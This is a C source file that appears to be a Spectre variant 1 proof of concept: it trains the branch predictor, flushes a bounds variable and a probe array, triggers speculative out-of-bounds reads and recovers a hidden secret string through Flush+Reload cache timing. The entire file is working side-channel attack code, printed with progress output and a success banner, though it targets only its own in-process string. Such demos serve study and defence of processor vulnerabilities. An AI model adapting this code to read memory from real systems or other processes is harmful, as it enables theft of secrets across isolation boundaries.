#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <emmintrin.h>
#include <sched.h>

#define BORING_DATA "boring data | "
#define SECRET "SUPER DONALD TRUMP TOP SECRET"
#define TOTAL_DATA BORING_DATA SECRET

#define PAGESIZE 4096
struct page_ {
  char data_[PAGESIZE];
} typedef page_;

unsigned char array1[128];
page_ *array2;
const int CACHE_MISS = 280;  // Between 139 and 417
size_t boring_data_length = sizeof(BORING_DATA) - 1;
page_ temp;

char target_function(int x)
{
  if (((float) x / (float) boring_data_length < 1.0))
  {
    temp = array2[array1[x]];
  }
}

void init_array1()
{
  memcpy(array1, TOTAL_DATA, sizeof(TOTAL_DATA));
  array1[sizeof(array1) - 1] = '\0';
}

void init_array2()
{
  #ifdef _WIN32
    array2 = (page_*)_aligned_malloc(256 * sizeof(page_), PAGESIZE);
  #else
    array2 = (page_*)aligned_alloc(PAGESIZE, 256 * sizeof(page_));
  #endif
  memset(array2, 0, 256 * sizeof(page_));
}

void spoofPHT()
{
  for (int i = 0; i < 20; i++) {
    target_function(5);
  }
}

uint64_t rdtsc()
{
  uint64_t a, d;
  _mm_mfence();
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  a = (d << 32) | a;
  _mm_mfence();
  return a;
}

int measure_cache_miss_threshold(void *ptr)
{
  uint64_t start = 0, end = 0;
  volatile int reg;
  uint64_t total = 0;

  for (int i = 0; i < 1000; i++) {
    _mm_clflush(ptr);
    _mm_mfence();
    
    start = rdtsc();
    reg = *(int*)ptr;
    _mm_mfence();
    end = rdtsc();
    
    total += (end - start);
  }
  printf("The cache miss latency is %lu\n", total / 1000);

  total = 0;
  reg = *(int*)ptr;
  _mm_mfence();
  
  for (int i = 0; i < 1000; i++) {
    _mm_mfence();
    
    start = rdtsc();
    reg = *(int*)ptr;
    _mm_mfence();
    end = rdtsc();
    
    total += (end - start);
  }
  printf("The cache hit latency is %lu\n", total / 1000);

  return 0;
}

int check_if_in_cache(void *ptr)
{
  uint64_t start = 0, end = 0;
  volatile int reg;

  _mm_mfence();
  start = rdtsc();
  reg = *(int*)ptr;
  _mm_mfence();
  end = rdtsc();

  if (end - start < CACHE_MISS)
    return 1;

  return 0;
}

void recover_data_from_cache(char *leaked, int index)
{
  int results[256];
  memset(results, 0, sizeof(results));
  
  // Probe in random order to find which element is cached
  for (int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255;
    
    if (check_if_in_cache(&array2[mix_i])) {
      results[mix_i]++;
    }
  }
  
  // Find the element with cache hit (excluding element 0 which might be noise)
  int max_count = 0;
  int max_index = 0;
  for (int i = 1; i < 256; i++) {
    if (results[i] > max_count) {
      max_count = results[i];
      max_index = i;
    }
  }
  
  // Update if we found something
  if (max_count > 0) {
    leaked[index] = (char)max_index;
  }
}

int main(int argc, const char **argv)
{
  init_array1();
  init_array2();

  measure_cache_miss_threshold(&array1[0]);

  char leaked[sizeof(TOTAL_DATA) + 1];
  memset(leaked, '?', sizeof(leaked));
  leaked[sizeof(TOTAL_DATA)] = '\0';

  printf("Starting attack...\n");
  printf("Target string: %s\n\n", TOTAL_DATA);
  
  int total_attempts = 0;
  
  while (1) {
    total_attempts++;
    
    for (int i = 0; i < sizeof(TOTAL_DATA); i++)
    {
      // Skip if already recovered
      if (leaked[i] != '?' && leaked[i] == array1[i]) continue;
      
      // Train the branch predictor with valid accesses
      spoofPHT();
      
      // Flush the size variable from cache to slow down the bounds check
      _mm_clflush(&boring_data_length);
      
      // Flush all of array2 from cache before the attack
      for (int j = 0; j < 256; j++) {
        _mm_clflush(&array2[j]);
      }
      
      // Memory barrier to ensure flushes complete
      _mm_mfence();
      
      // Small delay
      for (volatile int z = 0; z < 100; z++) {}
      
      // Serialize execution before the speculative attack
      _mm_lfence();
      
      // Trigger speculative execution - this should speculatively access array2[array1[i]]
      target_function(i);
      
      // Serialize execution after the attack
      _mm_lfence();
      
      // Now probe which element of array2 is in cache
      recover_data_from_cache(leaked, i);
    }
    
    // Print progress every 10 attempts
    if (total_attempts % 10 == 0) {
      printf("Attempt %d: %s\n", total_attempts, leaked);
    }
    
    // Check if we've recovered the secret
    if (!strncmp(leaked + sizeof(BORING_DATA) - 1, SECRET, sizeof(SECRET) - 1)) {
      printf("\n=== SUCCESS ===\n");
      break;
    }
    
    // Give up after too many attempts
    if (total_attempts > 1000) {
      printf("\nGiving up after %d attempts\n", total_attempts);
      break;
    }
  }

  printf("Full leaked data: %s\n", leaked);
  printf("Secret portion: ");
  for(int i = sizeof(BORING_DATA) - 1; i < sizeof(TOTAL_DATA); i++)
    printf("%c", leaked[i]);
  printf("\n");

  return 0;
}
